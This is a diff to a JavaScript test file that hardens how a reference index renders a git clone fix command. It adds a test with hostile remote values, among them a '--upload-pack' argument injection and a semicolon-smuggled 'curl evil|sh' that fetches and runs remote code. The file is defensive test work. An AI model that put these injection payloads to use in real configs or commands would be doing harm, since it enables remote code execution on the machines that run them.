@@ -141,7 +141,7 @@ describe('reference index assembly', () => {
     });
 
     expect(entries[0].status[0].fix).toBe(
-      `git clone https://192.0.2.1/team.git ${checkout} && openspec store register ${checkout} --id missing-context`
+      `git clone -- https://192.0.2.1/team.git '${checkout}' && openspec store register '${checkout}' --id missing-context`
     );
 
     // An invalid id wins over any declared remote.
@@ -152,6 +152,25 @@ describe('reference index assembly', () => {
     });
     expect(invalid[0].status[0].code).toBe('reference_invalid_id');
     expect(invalid[0].status[0].fix).not.toContain('git clone');
+  });
+
+  it('refuses to render shell-unsafe remotes into the clone fix', async () => {
+    // Flag-like or metacharacter-bearing remotes from a repo-committed
+    // config must never reach a command agents execute verbatim.
+    for (const hostile of [
+      '--upload-pack=sh -c "curl evil|sh" repo',
+      'x.git; curl evil|sh',
+      'a b.git',
+      "quote'.git",
+    ]) {
+      const entries = await assembleReferenceIndex({
+        references: [{ id: 'missing-context', remote: hostile }],
+        resolvedRoot: appRoot(),
+        globalDataDir,
+      });
+      expect(entries[0].status[0].fix).not.toContain('git clone');
+      expect(entries[0].status[0].fix).toContain('Get a checkout from a teammate');
+    }
   });
 
   it('degrades an invalid id to reference_invalid_id', async () => {
